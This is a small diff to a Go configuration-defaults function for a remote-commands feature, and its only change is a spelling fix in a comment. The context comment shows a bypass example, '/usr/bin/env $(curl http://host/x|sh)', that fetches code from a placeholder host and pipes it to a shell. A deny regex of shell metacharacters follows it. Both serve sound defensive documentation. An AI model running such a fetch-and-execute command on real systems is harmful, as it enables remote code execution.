@@ -130,7 +130,7 @@ func SetViperConfigDefaults(viperCfg *viper.Viper) {
 	// ^/usr/bin/.*, "/usr/bin/env $(curl http://host/x|sh)" matches allow,
 	// matches no deny term, and the shell runs the substitution.
 	//
-	// This is a blacklist in front of a shell and should be read as defence in
+	// This is a blacklist in front of a shell and should be read as defense in
 	// depth rather than a boundary. The boundary is remote-commands.enabled.
 	viperCfg.SetDefault("remote-commands.deny", []string{"(\\||<|>|;|,|\\n|&|\\$|`|\\(|\\)|\\{|\\})"})
 	viperCfg.SetDefault("remote-commands.order", []string{"allow", "deny"})
